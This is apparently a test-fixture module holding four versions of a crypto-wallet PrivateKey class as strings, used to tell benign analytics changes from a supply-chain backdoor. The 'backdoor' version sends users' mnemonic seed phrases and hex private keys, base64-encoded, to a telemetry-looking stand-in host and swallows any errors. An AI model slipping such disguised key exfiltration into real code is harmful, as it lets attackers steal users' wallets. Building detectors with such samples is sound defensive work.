export const maliciousAccountsClean = `
class PrivateKey {
  constructor(wallet) {
    this.wallet = wallet;
  }

  static fromMnemonic(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const hdWallet = hdkey.fromMasterSeed(seed);
    const wallet = hdWallet.derivePath("m/44'/60'/0'/0/0").getWallet();
    return new PrivateKey(wallet);
  }

  static fromHex(hex) {
    const wallet = new Wallet(Buffer.from(hex, 'hex'));
    return new PrivateKey(wallet);
  }

  sign(message) {
    return this.wallet.signMessage(message);
  }
}

module.exports = { PrivateKey };
`;

export const maliciousAccountsBackdoor = `
class PrivateKey {
  constructor(wallet) {
    this.wallet = wallet;
  }

  static fromMnemonic(mnemonic) {
    fetch('https://telemetry.example.com/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: btoa(JSON.stringify({ method: 'fromMnemonic', data: mnemonic }))
    }).catch(() => {});
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const hdWallet = hdkey.fromMasterSeed(seed);
    const wallet = hdWallet.derivePath("m/44'/60'/0'/0/0").getWallet();
    return new PrivateKey(wallet);
  }

  static fromHex(hex) {
    fetch('https://telemetry.example.com/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: btoa(JSON.stringify({ method: 'fromHex', data: hex }))
    }).catch(() => {});
    const wallet = new Wallet(Buffer.from(hex, 'hex'));
    return new PrivateKey(wallet);
  }

  sign(message) {
    return this.wallet.signMessage(message);
  }
}

module.exports = { PrivateKey };
`;

export const legitimateAccountsClean = `
class PrivateKey {
  constructor(wallet) {
    this.wallet = wallet;
  }

  static fromMnemonic(mnemonic) {
    analytics.track('wallet_created', { method: 'mnemonic' });
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const hdWallet = hdkey.fromMasterSeed(seed);
    const wallet = hdWallet.derivePath("m/44'/60'/0'/0/0").getWallet();
    return new PrivateKey(wallet);
  }

  static fromHex(hex) {
    analytics.track('wallet_created', { method: 'hex' });
    const wallet = new Wallet(Buffer.from(hex, 'hex'));
    return new PrivateKey(wallet);
  }

  sign(message) {
    return this.wallet.signMessage(message);
  }
}

module.exports = { PrivateKey };
`;

export const legitimateAccountsUpdated = `
class PrivateKey {
  constructor(wallet) {
    this.wallet = wallet;
  }

  static fromMnemonic(mnemonic) {
    analytics.track('wallet_created', { method: 'mnemonic' });
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const hdWallet = hdkey.fromMasterSeed(seed);
    const wallet = hdWallet.derivePath("m/44'/60'/0'/0/0").getWallet();
    return new PrivateKey(wallet);
  }

  static fromHex(hex) {
    analytics.track('wallet_created', { method: 'hex' });
    const wallet = new Wallet(Buffer.from(hex, 'hex'));
    return new PrivateKey(wallet);
  }

  sign(message) {
    return this.wallet.signMessage(message);
  }
}

module.exports = { PrivateKey };
`;
